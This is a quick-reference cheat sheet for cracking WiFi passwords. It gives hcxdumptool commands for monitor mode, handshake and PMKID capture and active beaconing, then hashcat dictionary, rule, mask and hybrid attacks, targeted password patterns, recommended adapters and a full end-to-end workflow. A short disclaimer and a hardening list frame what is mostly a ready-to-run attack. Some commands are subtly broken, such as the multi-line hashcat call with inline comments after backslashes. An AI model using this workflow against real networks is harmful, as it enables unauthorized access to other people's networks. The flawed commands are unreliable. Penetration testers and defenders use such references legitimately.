# WiFi Security Testing - Quick Reference Cheat Sheet

## ⚠️ AUTHORIZED TESTING ONLY - LEGAL USE REQUIRED

---

## Essential Commands

### 1. Enable Monitor Mode
```bash
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
```

### 2. Capture Handshake/PMKID
```bash
# Basic capture
sudo hcxdumptool -i wlan0 -o capture.pcapng --enable_status=15

# With timeout (5 minutes)
sudo hcxdumptool -i wlan0 -o capture.pcapng --enable_status=15 --tot=300
```

### 3. Convert to Hashcat Format
```bash
hcxpcapngtool -o hash.hc22000 capture.pcapng
```

### 4. Crack with Hashcat
```bash
# Dictionary attack
hashcat -m 22000 hash.hc22000 wordlist.txt

# With rules
hashcat -m 22000 hash.hc22000 wordlist.txt -r rules/best64.rule

# Mask attack (8 lowercase letters)
hashcat -m 22000 hash.hc22000 -a 3 ?l?l?l?l?l?l?l?l

# Hybrid (word + 3 digits)
hashcat -m 22000 hash.hc22000 -a 6 wordlist.txt ?d?d?d
```

### 5. Show Results
```bash
hashcat -m 22000 hash.hc22000 --show
```

---

## Complete Workflow

```bash
# 1. Setup
sudo systemctl stop NetworkManager
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up

# 2. Capture (5 minutes)
sudo hcxdumptool -i wlan0 -o wifi.pcapng --enable_status=15 --tot=300

# 3. Convert
hcxpcapngtool -o wifi.hc22000 wifi.pcapng

# 4. Crack
hashcat -m 22000 wifi.hc22000 rockyou.txt -O -w 3

# 5. View results
hashcat -m 22000 wifi.hc22000 --show

# 6. Cleanup
sudo ip link set wlan0 down
sudo iw dev wlan0 set type managed
sudo ip link set wlan0 up
sudo systemctl start NetworkManager
```

---

## Hashcat Mask Characters

| Char | Meaning |
|------|---------|
| ?l | Lowercase (a-z) |
| ?u | Uppercase (A-Z) |
| ?d | Digit (0-9) |
| ?s | Special chars |
| ?a | All characters |

---

## Common Patterns

```bash
# 8 digits (12345678)
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d

# Capitalized word + year (Password2024)
hashcat -m 22000 hash.hc22000 -a 6 wordlist.txt ?d?d?d?d

# Phone number format (555-1234)
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d-?d?d?d?d

# Common password + special + digits (password!123)
hashcat -m 22000 hash.hc22000 -a 6 wordlist.txt ?s?d?d?d
```

---

## Troubleshooting

### No handshakes captured?
```bash
# Try active beacon mode
sudo hcxdumptool -i wlan0 -o capture.pcapng --enable_status=15 --active_beacon --tot=300
```

### Interface busy?
```bash
sudo airmon-ng check kill
# or
sudo systemctl stop NetworkManager && sudo killall wpa_supplicant
```

### GPU not working?
```bash
# List devices
hashcat -I

# Use specific GPU
hashcat -m 22000 hash.hc22000 wordlist.txt -d 1
```

---

## Performance Optimization

```bash
# Optimized cracking
hashcat -m 22000 hash.hc22000 wordlist.txt \
  -O \                    # Optimize
  -w 3 \                  # Workload: high
  --status \              # Show status
  --status-timer=10       # Update every 10s
```

---

## Installation

```bash
# Debian/Ubuntu/Kali
sudo apt update
sudo apt install hcxdumptool hcxtools hashcat -y

# Verify
hcxdumptool --version
hashcat --version
```

---

## Recommended WiFi Adapters

- ALFA AWUS036ACH (RTL8812AU)
- ALFA AWUS036NHA (AR9271)
- TP-Link TL-WN722N v1 (AR9271)

---

## Rule Files (in /usr/share/hashcat/rules/)

- best64.rule - Most popular
- rockyou-30000.rule - Extensive
- d3ad0ne.rule - Advanced

---

## Session Management

```bash
# Start named session
hashcat --session=mysession -m 22000 hash.hc22000 wordlist.txt

# Pause: Press 'p'

# Resume
hashcat --session=mysession --restore

# Status: Press 's'
```

---

## Security Best Practices

### Strong Password Requirements:
- Minimum 12-16 characters
- Mix of upper/lower/numbers/symbols
- No dictionary words
- No personal info

### Network Hardening:
- Use WPA3 (not WPA2)
- Disable WPS
- Enable PMF (802.11w)
- Regular password rotation
- Network segmentation

---

**Remember: Only test networks you own or have written authorization to test!**

Last Updated: November 2024
